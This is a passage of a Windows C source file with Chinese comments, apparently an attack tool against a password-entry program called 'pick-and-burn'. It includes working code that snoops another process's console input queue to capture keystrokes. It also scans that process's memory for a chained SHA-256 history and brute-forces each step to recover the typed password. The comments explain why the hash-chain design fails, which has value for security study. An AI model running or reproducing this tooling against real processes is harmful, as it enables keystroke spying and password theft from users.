    printf("开始偷窥 %lu 的控制台输入队列，持续 %d 秒（%s）…\n",
           (unsigned long)pid, seconds, busy ? "忙轮询" : "让出 CPU");

    t0 = GetTickCount();
    while ((long)(GetTickCount() - t0) < seconds * 1000L) {
        DWORD  got = 0;
        char   cur[8192];
        size_t cn = 0;
        size_t pn, best = 0, i;

        rounds++;
        if (!PeekConsoleInputW(hin, buf, 256, &got) || got == 0) {
            YIELD();
            continue;
        }
        for (DWORD k = 0; k < got && cn + 2 < sizeof cur; k++) {
            if (buf[k].EventType != KEY_EVENT) {
                continue;
            }
            if (!buf[k].Event.KeyEvent.bKeyDown) {
                continue;
            }
            wchar_t ch = buf[k].Event.KeyEvent.uChar.UnicodeChar;
            if (ch >= 0x20 && ch < 0x7f) {
                cur[cn++] = (char)ch;
            }
        }
        cur[cn] = '\0';
        if (cn == 0 || strcmp(cur, prev) == 0) {
            YIELD();
            continue;                    /* 队列没变化 */
        }

        /* 程序从队头消费，所以 cur 应当是 prev 的后缀接上新增记录。
         * 找出最长的「prev 后缀 == cur 前缀」，之后的就是新按键。 */
        pn = strlen(prev);
        for (size_t k = 1; k <= pn && k <= cn; k++) {
            if (memcmp(prev + pn - k, cur, k) == 0) {
                best = k;
            }
        }
        for (i = best; i < cn; i++) {
            if (alln + 1 < sizeof all) {
                all[alln++] = cur[i];
            }
        }
        all[alln] = '\0';
        memcpy(prev, cur, cn + 1);
        YIELD();
    }

    CloseHandle(hin);
    printf("轮询 %ld 次，捕获 %zu 个按键：\n", rounds, alln);
    printf("  %s\n", all);
    return 0;
}

/* ==========================================================================
 * [E] 从「链式哈希」的历史里反推密码 —— 不需要读屏幕
 *
 * 新版把使用者的输入逐字符推进一条链：
 *
 *     h_0 = SHA256("pick-and-burn/chain/v1")
 *     h_k = SHA256( h_{k-1} ‖ 31 个零字节 ‖ c_k )
 *
 * 设计意图是「内存里任何时刻最多存在 1 个明文字符」。这一点它确实做到了。
 * 但它把 h_0..h_k 的**完整历史**留在内存里 —— 退格要靠它（chain_pop 只是
 * len--），所以整条链在练习期间一直驻留。
 *
 * 致命之处在于：每一步推进的输入只有 1 个字符，取值空间是 95 个可打印
 * ASCII。因此只要拿到相邻的两个状态 h_{k-1} 与 h_k，就能把 c_k 枚举出来：
 *
 *     for c in 0x20..0x7e:
 *         if SHA256(h_{k-1} ‖ 0^31 ‖ c) == h_k   →   c_k = c
 *
 * 95 次 SHA-256 是微秒级开销。于是整条历史 = 明文密码的可解码表示。
 *
 * 这与「单向函数保护明文」的直觉相反：单向性保护的是**大空间**。当每一步
 * 的输入空间只有 95（若已知是小写字母则只有 26）时，逐步可枚举性把所有
 * 中间状态都变成了明文本身。
 *
 * 这条路径完全不碰屏幕、不碰键盘、不需要 AttachConsole，
 * 只要一次 OpenProcess(PROCESS_VM_READ)。
 * ========================================================================== */

#define SHA256_LEN 32
#define CHAIN_MAX  96

static int sha256_buf(const void *p, size_t n, unsigned char out[SHA256_LEN])
{
    BCRYPT_ALG_HANDLE  alg = NULL;
    BCRYPT_HASH_HANDLE hh  = NULL;
    int                ok  = -1;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }
    if (BCryptCreateHash(alg, &hh, NULL, 0, NULL, 0, 0) == 0) {
        if (BCryptHashData(hh, (PUCHAR)(void *)p, (ULONG)n, 0) == 0 &&
            BCryptFinishHash(hh, out, SHA256_LEN, 0) == 0) {
            ok = 0;
        }
        BCryptDestroyHash(hh);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

/* 给定 h_{k-1} 与 h_k，枚举出 c_k */
static int chain_recover_char(const unsigned char prev[SHA256_LEN],
                              const unsigned char expect[SHA256_LEN],
                              unsigned char *out)
{
    unsigned char buf[64];
    unsigned char digest[SHA256_LEN];

    memcpy(buf, prev, SHA256_LEN);
    memset(buf + SHA256_LEN, 0, 31);
    for (int c = 0x20; c <= 0x7e; c++) {
        buf[63] = (unsigned char)c;
        if (sha256_buf(buf, sizeof buf, digest) == 0 &&
            memcmp(digest, expect, SHA256_LEN) == 0) {
            *out = (unsigned char)c;
            return 0;
        }
    }
    return -1;
}

/* 从一处候选起点把整条链解开 */
static int chain_unroll(HANDLE proc, unsigned char *base, char *out, int cap)
{
    unsigned char cur[SHA256_LEN];
    unsigned char nxt[SHA256_LEN];
    int           n = 0;

    if (!ReadProcessMemory(proc, base, cur, SHA256_LEN, NULL)) {
        return 0;
    }
    while (n < cap - 1 && n < CHAIN_MAX) {
        unsigned char c = 0;
        if (!ReadProcessMemory(proc, base + (size_t)(n + 1) * SHA256_LEN, nxt,
                               SHA256_LEN, NULL)) {
            break;
        }
        if (chain_recover_char(cur, nxt, &c) != 0) {
            break;
        }
        out[n++] = (char)c;
        memcpy(cur, nxt, SHA256_LEN);
    }
    out[n] = '\0';
    return n;
}

static int cmd_crack(DWORD pid)
{
    const char   *DOMAIN = "pick-and-burn/chain/v1";
    unsigned char h0[SHA256_LEN];
    HANDLE        h;
    SYSTEM_INFO   si;
    unsigned char *addr, *limit;
    MEMORY_BASIC_INFORMATION mbi;
    const SIZE_T  CHUNK = 4u << 20;
    unsigned char *buf;
    int           found = 0;
    long long     scanned = 0;

    if (sha256_buf(DOMAIN, strlen(DOMAIN), h0) != 0) {
        fprintf(stderr, "SHA-256 初始化失败\n");
        return 1;
    }
    printf("链的起点 h_0 = SHA256(\"%s\")\n  = ", DOMAIN);
    for (int i = 0; i < SHA256_LEN; i++) {
        printf("%02x", h0[i]);
    }
    printf("\n这是程序里的固定常量，攻击者当然知道 —— 正好用来在内存里定位链。\n\n");

    h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (h == NULL) {
        fprintf(stderr, "OpenProcess(%lu) 失败，错误码 %lu\n",
                (unsigned long)pid, (unsigned long)GetLastError());
        return 1;
    }

    buf = (unsigned char *)malloc(CHUNK + 64);
    if (buf == NULL) {
        CloseHandle(h);
        return 1;
    }

    GetSystemInfo(&si);
    addr  = (unsigned char *)si.lpMinimumApplicationAddress;
    limit = (unsigned char *)si.lpMaximumApplicationAddress;

    while (addr < limit && found < 4) {
        SIZE_T size;
        int    readable;

        if (!VirtualQueryEx(h, addr, &mbi, sizeof mbi)) {
            break;
        }
        size = mbi.RegionSize;
        if (size == 0) {
            addr += 4096;
            continue;
        }
        readable = (mbi.State == MEM_COMMIT) &&
                   ((mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                                    PAGE_WRITECOPY | PAGE_EXECUTE_READ |
                                    PAGE_EXECUTE_READWRITE |
                                    PAGE_EXECUTE_WRITECOPY)) != 0) &&
                   ((mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) == 0);
        if (readable) {
            SIZE_T off;
            scanned += (long long)size;
            for (off = 0; off < size && found < 4; off += CHUNK) {
                SIZE_T want = size - off, got = 0, i;
                if (want > CHUNK) {
                    want = CHUNK;
                }
                if (!ReadProcessMemory(h, addr + off, buf, want, &got) ||
                    got < SHA256_LEN) {
                    continue;
                }
                for (i = 0; i + SHA256_LEN <= got && found < 4; i++) {
                    unsigned char *cand;
                    char           rec[CHAIN_MAX + 4];
                    int            n;
                    if (memcmp(buf + i, h0, SHA256_LEN) != 0) {
                        continue;
                    }
                    cand = addr + off + i;
                    n    = chain_unroll(h, cand, rec, (int)sizeof rec);
                    if (n >= 4) {
                        printf("命中链起点 %p → 从历史里恢复出 %d 个字符：\n", cand, n);
                        printf("    %s\n\n", rec);
                        found++;
                    }
                }
            }
        }
        addr += size;
    }

    printf("扫描约 %lld MiB，解开 %d 条链。\n",
           scanned / (1024 * 1024), found);
    if (found == 0) {
        printf("这次没命中 —— 链还没被写进内存，或者已经被清零。\n");
    }
    free(buf);
    CloseHandle(h);
    return 0;
}

/* ==========================================================================
 * main
 * ========================================================================== */

static void usage(const char *argv0)
{
    printf("用法：%s <命令> [参数]\n", argv0);
    printf("  find   <进程名>\n");
    printf("  spawn  <exe路径> \"<参数>\"\n");
    printf("  screen <pid>\n");
    printf("  solve  <pid> [词表路径]\n");
    printf("  mem    <pid> [最短长度]\n");
    printf("  all    <pid> [词表路径]\n");
    printf("  keys   <pid> \"<文本，\\n 表示回车>\"\n");
    printf("  peek   <pid> [秒数]                       偷窥控制台输入队列\n");
    printf("  crack  <pid>                              解开链式哈希历史 → 密码\n");
    printf("  il                                        看本进程的完整性级别\n");
    printf("  low    <子命令...>                        以低完整性(Low IL)重跑自己\n");
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        usage(argv[0]);
        return 2;
    }

    const char *cmd = argv[1];

    if (strcmp(cmd, "find") == 0 && argc >= 3) {
        DWORD pid = find_pid(argv[2]);
        if (pid == 0) {
            printf("没找到 %s\n", argv[2]);
            return 1;
        }
        printf("PID=%lu\n", (unsigned long)pid);
        return 0;
    }
    if (strcmp(cmd, "spawn") == 0 && argc >= 3) {
        return cmd_spawn(argv[2], (argc >= 4) ? argv[3] : "");
    }
    if (strcmp(cmd, "screen") == 0 && argc >= 3) {
        return cmd_screen((DWORD)strtoul(argv[2], NULL, 10));
    }
    if (strcmp(cmd, "solve") == 0 && argc >= 3) {
        wchar_t *wl = (argc >= 4) ? widen_acp(argv[3]) : NULL;
        int      rc = cmd_solve((DWORD)strtoul(argv[2], NULL, 10),
                                wl ? wl : DEFAULT_WORDLIST);
        free(wl);
        return rc;
    }
    if (strcmp(cmd, "mem") == 0 && argc >= 3) {
        int minlen = (argc >= 4) ? atoi(argv[3]) : 12;
        return cmd_mem((DWORD)strtoul(argv[2], NULL, 10), minlen);
    }
    if (strcmp(cmd, "keys") == 0 && argc >= 4) {
        return cmd_keys((DWORD)strtoul(argv[2], NULL, 10), argv[3]);
    }
    if (strcmp(cmd, "peek") == 0 && argc >= 3) {
        int sec = (argc >= 4) ? atoi(argv[3]) : 8;
        return cmd_peek((DWORD)strtoul(argv[2], NULL, 10), sec,
                        (argc >= 5 && strcmp(argv[4], "busy") == 0));
    }
    if (strcmp(cmd, "crack") == 0 && argc >= 3) {
        return cmd_crack((DWORD)strtoul(argv[2], NULL, 10));
    }
    if (strcmp(cmd, "all") == 0 && argc >= 3) {
        DWORD       pid = (DWORD)strtoul(argv[2], NULL, 10);
        wchar_t    *wl  = (argc >= 4) ? widen_acp(argv[3]) : NULL;
        cmd_screen(pid);
        printf("\n");
        cmd_solve(pid, wl ? wl : DEFAULT_WORDLIST);
        printf("\n");
        cmd_mem(pid, 12);
        free(wl);
        return 0;
    }

    if (strcmp(cmd, "il") == 0) {
        return cmd_il();
    }
    if (strcmp(cmd, "low") == 0 && argc >= 3) {
        return cmd_low(argc, argv);
    }

    usage(argv[0]);
    return 2;
}
